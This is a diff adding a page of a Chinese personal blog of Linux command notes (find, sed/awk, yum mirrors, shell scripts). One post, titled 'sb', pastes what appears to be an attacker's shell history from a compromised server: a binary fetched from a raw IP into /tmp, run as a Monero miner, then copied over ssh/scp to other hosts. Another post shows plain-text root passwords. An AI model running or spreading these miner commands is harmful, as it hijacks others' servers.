@@ -1,0 +1,648 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>你才是程序员</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="一个码畜的博客">
+<meta property="og:type" content="website">
+<meta property="og:title" content="你才是程序员">
+<meta property="og:url" content="http://hanlaotwo.com/page/8/index.html">
+<meta property="og:site_name" content="你才是程序员">
+<meta property="og:description" content="一个码畜的博客">
+<meta property="og:locale" content="zh_CN">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="你才是程序员">
+<meta name="twitter:description" content="一个码畜的博客">
+  
+    <link rel="alternate" href="/blog/atom.xml" title="你才是程序员" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/blog/css/style.css">
+</head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/blog/" id="logo">你才是程序员</a>
+      </h1>
+      
+        <h2 id="subtitle-wrap">
+          <a href="/blog/" id="subtitle">no bb show your code</a>
+        </h2>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/blog/">Home</a>
+        
+          <a class="main-nav-link" href="/blog/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/blog/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://hanlaotwo.com"></form>
+      </div>
+    </div>
+  </div>
+  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<script>
+  (adsbygoogle = window.adsbygoogle || []).push({
+    google_ad_client: "ca-pub-1560148445627079",
+    enable_page_level_ads: true
+  });
+</script>
+</header>
+      <div class="outer">
+        <section id="main">
+  
+    <article id="post-Linux/find" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/blog/2018/07/10/Linux/find/" class="article-date">
+  <time datetime="2018-07-10T13:09:19.000Z" itemprop="datePublished">2018-07-10</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/blog/2018/07/10/Linux/find/">find</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>列出当前目录及子目录下所有文件和文件夹 </p>
+<pre><code>find . 
+</code></pre><p>在/home目录下查找以.txt结尾的文件名 </p>
+<pre><code>find /home -name &quot;*.txt&quot; 
+</code></pre><p>同上，但忽略大小写 </p>
+<pre><code>find /home -iname &quot;*.txt&quot;
+</code></pre><p>当前目录及子目录下查找所有以.txt和.pdf结尾的文件 </p>
+<pre><code>find . \( -name &quot;*.txt&quot; -o -name &quot;*.pdf&quot; \) 或 find . -name &quot;*.txt&quot; -o -name &quot;*.pdf&quot; 
+</code></pre><p>匹配文件路径或者文件 </p>
+<pre><code>find /usr/ -path &quot;*local*&quot; 
+</code></pre><p>基于正则表达式匹配文件路径 </p>
+<pre><code>find . -regex &quot;.*\(\.txt\|\.pdf\)$&quot; 
+</code></pre><p>同上，但忽略大小写 </p>
+<pre><code>find . -iregex &quot;.*\(\.txt\|\.pdf\)$&quot; 
+</code></pre><p>否定参数 </p>
+<p>找出/home下不是以.txt结尾的文件 </p>
+<pre><code>find /home ! -name &quot;*.txt&quot; 
+</code></pre><p>根据文件类型进行搜索 </p>
+<pre><code>find . -type 类型参数 
+</code></pre><p>类型参数列表： </p>
+<p>f 普通文件 </p>
+<p>l 符号连接 </p>
+<p>d 目录 </p>
+<p>c 字符设备 </p>
+<p>b 块设备 </p>
+<p>s 套接字 </p>
+<p>p Fifo 基于目录深度搜索 </p>
+<p>向下最大深度限制为</p>
+<pre><code>3 find . -maxdepth 3 -type f 
+</code></pre><p>搜索出深度距离当前目录至少2个子目录的所有文件 </p>
+<pre><code>find . -mindepth 2 -type f 
+</code></pre><p>根据文件时间戳进行搜索 </p>
+<pre><code>find . -type f 时间戳 
+</code></pre><p>UNIX/Linux文件系统每个文件都有三种时间戳：</p>
+<p>访问时间（-atime/天，-amin/分钟）：用户最近一次访问时间。</p>
+<p>修改时间（-mtime/天，-mmin/分钟）：文件最后一次修改时间。</p>
+<p>变化时间（-ctime/天，-cmin/分钟）：文件数据元（例如权限等）最后一次修改时间。</p>
+<p>搜索最近七天内被访问过的所有文件 </p>
+<pre><code>find . -type f -atime -7 
+</code></pre><p>搜索恰好在七天前被访问过的所有文件 </p>
+<pre><code>find . -type f -atime 7 
+</code></pre><p>搜索超过七天内被访问过的所有文件</p>
+<pre><code>...
+</code></pre><p>来自: <a href="http://man.linuxde.net/find" target="_blank" rel="noopener">http://man.linuxde.net/find</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://hanlaotwo.com/2018/07/10/Linux/find/" data-id="cjjedmhaa00430gtj6wbjdmdq" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/blog/tags/Linux/">Linux</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-Linux/awk;sed;grep;jq" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/blog/2018/07/10/Linux/awk;sed;grep;jq/" class="article-date">
+  <time datetime="2018-07-10T13:09:19.000Z" itemprop="datePublished">2018-07-10</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/blog/2018/07/10/Linux/awk;sed;grep;jq/">awk;sed;grep;jq</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p> grep 更适合单纯的查找或匹配文本<br> sed 更适合编辑匹配到的文本<br> awk 更适合格式化文本，对文本进行较复杂格式处理 </p>
+<p> sed<br> sed不支持正则非贪婪匹配（不支持？） </p>
+<p> g表示替换所有</p>
+<pre><code> echo &apos;!#$#$J#$##@B#@#&apos; | sed -r &apos;s/#//&apos;
+!$#$J#$##@B#@#
+
+echo &apos;!#$#$J#$##@B#@#&apos; | sed -r &apos;s/#//g&apos;
+!$$J$@B@
+</code></pre><p>awk<br>输出所有</p>
+<pre><code>awk -F\| &apos;{for(i=0;i&lt;=NF;++i){res=res&quot;\n&quot;$i} print res}&apos;
+
+echo &apos;#26#false#0.0400#500000#|#24#false#0.0540#500000#|#23#false#0.0600#500000#|&apos; | sed &apos;s/false//g&apos; | awk -F\| &apos;{for(i=0;i&lt;=NF;++i){res=res&quot;\n&quot;$i} print res}&apos;
+
+#26##0.0400#500000#|#24##0.0540#500000#|#23##0.0600#500000#|
+#26##0.0400#500000#
+#24##0.0540#500000#
+#23##0.0600#500000#
+</code></pre>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://hanlaotwo.com/2018/07/10/Linux/awk;sed;grep;jq/" data-id="cjjedmhab00440gtjc5hfxhds" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/blog/tags/Linux/">Linux</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-Linux/sb" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/blog/2018/07/10/Linux/sb/" class="article-date">
+  <time datetime="2018-07-10T13:09:19.000Z" itemprop="datePublished">2018-07-10</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/blog/2018/07/10/Linux/sb/">sb</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p><code>`</code><br>  you_wanna_fucking_login_motherfucker?<br>   218.82.180.97    Thu Oct  5 05:50 - 06:59  (01:08)<br>root     pts/0        123.206.13.151   Fri Sep 29 16:54 - 17:02  (00:07)<br>root     pts/0        45.63.122.222<br>   lscpu<br>  473  cat /etc/issue<br>  474  exit<br>  475  chmod +x /tmp/gcc<br>  476  /tmp/gcc -o stratum+tcp://pool.usxmrpool.com:3333 -u 43JPCm3BoBSH7X6tiXUGTMT1y8AY2aVMZWojELHhwNyi3QjrMeLzrfHZNxWZpmRhdvdSSHUvUxwLZ6cQFeqUa6R5NEYeifH -p x  &amp;<br>  477  top<br>  478  ping baidu.com<br>  479  ssh <a href="mailto:root@60.12.33.88" target="_blank" rel="noopener">root@60.12.33.88</a><br>  480  lscpu<br>  481  top<br>  482  /usr/bin/wget <a href="http://35.194.156.203/gcc" target="_blank" rel="noopener">http://35.194.156.203/gcc</a> -O /tmp/gcc<br>  483  chmod +x /tmp/gcc<br>  484  /tmp/gcc -o stratum+tcp://pool.usxmrpool.com:3333 -u 43JPCm3BoBSH7X6tiXUGTMT1y8AY2aVMZWojELHhwNyi3QjrMeLzrfHZNxWZpmRhdvdSSHUvUxwLZ6cQFeqUa6R5NEYeifH -p x  &amp;<br>  485  top<br>  486  ping baidu.com<br>  487  ping 3cac.com<br>  488  top<br>  489  /tmp/gcc -o stratum+tcp://pool.usxmrpool.com:2222 -u 43JPCm3BoBSH7X6tiXUGTMT1y8AY2aVMZWojELHhwNyi3QjrMeLzrfHZNxWZpmRhdvdSSHUvUxwLZ6cQFeqUa6R5NEYeifH -p x  &amp;<br>  490  top<br>  491  ssh <a href="mailto:root@141.137.149.141" target="_blank" rel="noopener">root@141.137.149.141</a><br>  492  ssh root<br>  493  ssh <a href="mailto:root@139.129.47.28" target="_blank" rel="noopener">root@139.129.47.28</a><br>  494  ssh <a href="mailto:root@25.153.248.225" target="_blank" rel="noopener">root@25.153.248.225</a><br>  495  ssh <a href="mailto:root@121.43.148.191" target="_blank" rel="noopener">root@121.43.148.191</a> -平2201<br>  496  ssh <a href="mailto:root@121.43.148.191" target="_blank" rel="noopener">root@121.43.148.191</a> -p 2201<br>  497  ssh <a href="mailto:root@121.41.175.41" target="_blank" rel="noopener">root@121.41.175.41</a><br>  498  cd /tmp<br>  499  ls<br>  500  ssp gcc <a href="mailto:root@121.41.175.41" target="_blank" rel="noopener">root@121.41.175.41</a>:/tmp/<br>  501  scp gcc <a href="mailto:root@121.41.175.41" target="_blank" rel="noopener">root@121.41.175.41</a>:/tmp/<br>  502  cd /tmp<br>  503  ssh <a href="mailto:root@121.41.175.41" target="_blank" rel="noopener">root@121.41.175.41</a><br>  504  ssh <a href="mailto:root@61.129.87.76" target="_blank" rel="noopener">root@61.129.87.76</a> -p 2204<br>  505  ssh <a href="mailto:root@54.223.83.133" target="_blank" rel="noopener">root@54.223.83.133</a><br>  506  ssh <a href="mailto:root@183.57.72.90" target="_blank" rel="noopener">root@183.57.72.90</a> -p 2222<br>  507  curl ip.cn<br>  508  ls<br>  509  scp gcc <a href="mailto:root@123.206.13.151" target="_blank" rel="noopener">root@123.206.13.151</a>:/tmp/<br>  510  ssh <a href="mailto:root@123.206.13.151" target="_blank" rel="noopener">root@123.206.13.151</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://hanlaotwo.com/2018/07/10/Linux/sb/" data-id="cjjedmhac00470gtjjz51v96v" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/blog/tags/Linux/">Linux</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-Linux/shell爬虫" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/blog/2018/07/10/Linux/shell爬虫/" class="article-date">
+  <time datetime="2018-07-10T13:09:19.000Z" itemprop="datePublished">2018-07-10</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/blog/2018/07/10/Linux/shell爬虫/">shell爬虫</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p><code>`</code><br>curl -H ‘User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0’ <a href="https://www.oschina.net/tweets" target="_blank" rel="noopener">https://www.oschina.net/tweets</a> | grep data-emoji-render | grep -o ‘“true”&gt;.*’ | sed ‘s/“true”&gt;//;s/&lt;\/span&gt;/\n/;s/&lt;\/div&gt;/\n/‘</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://hanlaotwo.com/2018/07/10/Linux/shell爬虫/" data-id="cjjedmhad00480gtjhlju8lpu" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/blog/tags/Linux/">Linux</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-Linux/shell数字运算" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/blog/2018/07/10/Linux/shell数字运算/" class="article-date">
+  <time datetime="2018-07-10T13:09:19.000Z" itemprop="datePublished">2018-07-10</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/blog/2018/07/10/Linux/shell数字运算/">shell数字运算</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo &apos;expr 1 + 1&apos;</span><br><span class="line">echo $[1 + 1]</span><br><span class="line">echo &quot;1+1&quot; | bc -l</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://hanlaotwo.com/2018/07/10/Linux/shell数字运算/" data-id="cjjedmhae004b0gtj88htysm7" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/blog/tags/Linux/">Linux</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-Linux/tomcat启动成功但是没有监听8080端口" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/blog/2018/07/10/Linux/tomcat启动成功但是没有监听8080端口/" class="article-date">
+  <time datetime="2018-07-10T13:09:19.000Z" itemprop="datePublished">2018-07-10</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/blog/2018/07/10/Linux/tomcat启动成功但是没有监听8080端口/">tomcat启动成功但是没有监听8080端口</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>查看tomcat日志<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd tomcat/logs</span><br><span class="line">cat catlina.out</span><br></pre></td></tr></table></figure></p>
+<p>错误如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/lib/jvm/java-1.7.0-openjdk-1.7.0.75.x86_64/jre/bin/java: No such file or directory</span><br></pre></td></tr></table></figure></p>
+<p>原因：</p>
+<p>Java虚拟机没有找到</p>
+<p>控制台输入java有输出</p>
+<p>直接安装jdk不配置环境变量输入java也会有输出</p>
+<p>解决：</p>
+<p>按照路径去找发现确实没有文件</p>
+<p>重新设置环境变量，配置正确的jre路径，然后重启</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://hanlaotwo.com/2018/07/10/Linux/tomcat启动成功但是没有监听8080端口/" data-id="cjjedmhaf004d0gtj44ori0uu" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/blog/tags/Linux/">Linux</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-Linux/yum" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/blog/2018/07/10/Linux/yum/" class="article-date">
+  <time datetime="2018-07-10T13:09:19.000Z" itemprop="datePublished">2018-07-10</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/blog/2018/07/10/Linux/yum/">yum</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>指定安装源<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yum install XXX --enablerepo=YYY</span><br><span class="line">yum install netcat --enablerepo=http://mirrors.aliyun.com/repo/Centos-7.repo</span><br></pre></td></tr></table></figure></p>
+<p>配置阿里镜像<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">1、备份</span><br><span class="line"></span><br><span class="line">mv /etc/yum.repos.d/CentOS-Base.repo /etc/yum.repos.d/CentOS-Base.repo.backup</span><br><span class="line"></span><br><span class="line">2、下载新的CentOS-Base.repo 到/etc/yum.repos.d/</span><br><span class="line"></span><br><span class="line">CentOS 5</span><br><span class="line"></span><br><span class="line">wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-5.repo</span><br><span class="line"></span><br><span class="line">或者</span><br><span class="line">curl -o /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-5.repo</span><br><span class="line"></span><br><span class="line">CentOS 6</span><br><span class="line"></span><br><span class="line">wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-6.repo</span><br><span class="line"></span><br><span class="line">或者</span><br><span class="line">curl -o /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-6.repo</span><br><span class="line"></span><br><span class="line">CentOS 7</span><br><span class="line"></span><br><span class="line">wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo</span><br><span class="line"></span><br><span class="line">或者</span><br><span class="line">curl -o /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo</span><br><span class="line"></span><br><span class="line">3、之后运行yum makecache生成缓存</span><br></pre></td></tr></table></figure></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://hanlaotwo.com/2018/07/10/Linux/yum/" data-id="cjjedmhah004g0gtjy3pmgrn6" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/blog/tags/Linux/">Linux</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-Linux/shell脚本" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/blog/2018/07/10/Linux/shell脚本/" class="article-date">
+  <time datetime="2018-07-10T13:09:19.000Z" itemprop="datePublished">2018-07-10</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/blog/2018/07/10/Linux/shell脚本/">shell脚本</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env bash</span><br><span class="line">cd /root/software/tag</span><br><span class="line">#删除文件</span><br><span class="line">echo &quot;开始删除文件&quot;</span><br><span class="line">hadoop fs -rm -R input/basic</span><br><span class="line"></span><br><span class="line">echo &quot;可运行的程序有: &quot;</span><br><span class="line">for program in Adapter Adpaterfour hello hhaha lallal;</span><br><span class="line">do</span><br><span class="line">    echo &quot;$&#123;program&#125;&quot;</span><br><span class="line">done</span><br><span class="line"></span><br><span class="line">echo &quot;输入要运行的程序,默认为Adapter&quot;</span><br><span class="line">while read var</span><br><span class="line">do</span><br><span class="line">if [ &quot;$var&quot; == &quot;&quot; ]</span><br><span class="line">then</span><br><span class="line">    nohup hadoop jar tag-0.0.1-jar-with-dependencies.jar com.hs.tag.jobflow.Adapter  --start_date=20170109 --end_date=20170109&gt;adapterlog.log 2&gt;&amp;1 &amp;</span><br><span class="line">    echo &quot;开始运行adapter程序，可以看日志了&quot;</span><br><span class="line">    break</span><br><span class="line">else</span><br><span class="line">    nohup hadoop jar tag-0.0.1-jar-with-dependencies.jar com.hs.tag.jobflow.$&#123;var&#125;  --start_date=20170515 --end_date=20170515&gt;adapterlog.log 2&gt;&amp;1 &amp;</span><br><span class="line">    echo &quot;开始运行$&#123;var&#125;程序，可以看日志了&quot;</span><br><span class="line">    break</span><br><span class="line">fi</span><br><span class="line">done</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://hanlaotwo.com/2018/07/10/Linux/shell脚本/" data-id="cjjedmhah004i0gtjcah4rru4" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/blog/tags/Linux/">Linux</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-Linux/yum makecache" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/blog/2018/07/10/Linux/yum makecache/" class="article-date">
+  <time datetime="2018-07-10T13:09:19.000Z" itemprop="datePublished">2018-07-10</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/blog/2018/07/10/Linux/yum makecache/">yum makecache</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-rw-r--r--. 1 root root 2573 10月 25 12:54 CentOS-Base.repo</span><br><span class="line">-rw-r--r--. 1 root root 1612 7月   4 2014 CentOS-Base.repo.backup</span><br><span class="line">-rw-r--r--. 1 root root  640 7月   4 2014 CentOS-Debuginfo.repo</span><br><span class="line">-rw-r--r--. 1 root root 1331 7月   4 2014 CentOS-Sources.repo</span><br><span class="line">-rw-r--r--. 1 root root  156 7月   4 2014 CentOS-Vault.repo</span><br><span class="line">-rw-r--r--. 1 root root 1209 1月  29 2014 mysql-community.repo.1</span><br><span class="line">-rw-r--r--. 1 root root 1060 1月  29 2014 mysql-community-source.repo.1</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://hanlaotwo.com/2018/07/10/Linux/yum makecache/" data-id="cjjedmhai004l0gtj6dpwd4eu" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/blog/tags/Linux/">Linux</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-Linux/修改密码，添加用户，配置权限" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/blog/2018/07/10/Linux/修改密码，添加用户，配置权限/" class="article-date">
+  <time datetime="2018-07-10T13:09:19.000Z" itemprop="datePublished">2018-07-10</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/blog/2018/07/10/Linux/修改密码，添加用户，配置权限/">修改密码，添加用户，配置权限</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>修改密码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">passwd root</span><br><span class="line">you_wanna_fucking_login_motherfucker? </span><br><span class="line">you_wanna_fucking_login_motherfucker?</span><br></pre></td></tr></table></figure></p>
+<p>添加用户<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">adduser hello</span><br><span class="line">passwd hello</span><br><span class="line">youmotherfucker</span><br></pre></td></tr></table></figure></p>
+<p>删除用户<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">deluser hello</span><br></pre></td></tr></table></figure></p>
+<p>权限分配</p>
+<p>root–组–其他</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://hanlaotwo.com/2018/07/10/Linux/修改密码，添加用户，配置权限/" data-id="cjjedmhaj004n0gtjq2gikqc1" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/blog/tags/Linux/">Linux</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+
+
+  <nav id="page-nav">
+    
+    <a class="extend prev" rel="prev" href="/blog/page/7/">&laquo; Prev</a><a class="page-number" href="/blog/">1</a><span class="space">&hellip;</span><a class="page-number" href="/blog/page/6/">6</a><a class="page-number" href="/blog/page/7/">7</a><span class="page-number current">8</span><a class="page-number" href="/blog/page/9/">9</a><a class="page-number" href="/blog/page/10/">10</a><span class="space">&hellip;</span><a class="page-number" href="/blog/page/18/">18</a><a class="extend next" rel="next" href="/blog/page/9/">Next &raquo;</a>
+  </nav>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/blog/tags/Hadoop/">Hadoop</a></li><li class="tag-list-item"><a class="tag-list-link" href="/blog/tags/Java/">Java</a></li><li class="tag-list-item"><a class="tag-list-link" href="/blog/tags/JavaScript/">JavaScript</a></li><li class="tag-list-item"><a class="tag-list-link" href="/blog/tags/Jstrom/">Jstrom</a></li><li class="tag-list-item"><a class="tag-list-link" href="/blog/tags/Linux/">Linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/blog/tags/kafka/">kafka</a></li><li class="tag-list-item"><a class="tag-list-link" href="/blog/tags/mysql/">mysql</a></li><li class="tag-list-item"><a class="tag-list-link" href="/blog/tags/note/">note</a></li><li class="tag-list-item"><a class="tag-list-link" href="/blog/tags/oracle/">oracle</a></li><li class="tag-list-item"><a class="tag-list-link" href="/blog/tags/python/">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/blog/tags/redis/">redis</a></li><li class="tag-list-item"><a class="tag-list-link" href="/blog/tags/scala/">scala</a></li><li class="tag-list-item"><a class="tag-list-link" href="/blog/tags/spark/">spark</a></li><li class="tag-list-item"><a class="tag-list-link" href="/blog/tags/web/">web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/blog/tags/work/">work</a></li><li class="tag-list-item"><a class="tag-list-link" href="/blog/tags/其他/">其他</a></li><li class="tag-list-item"><a class="tag-list-link" href="/blog/tags/开发工具/">开发工具</a></li><li class="tag-list-item"><a class="tag-list-link" href="/blog/tags/数据库/">数据库</a></li><li class="tag-list-item"><a class="tag-list-link" href="/blog/tags/项目/">项目</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
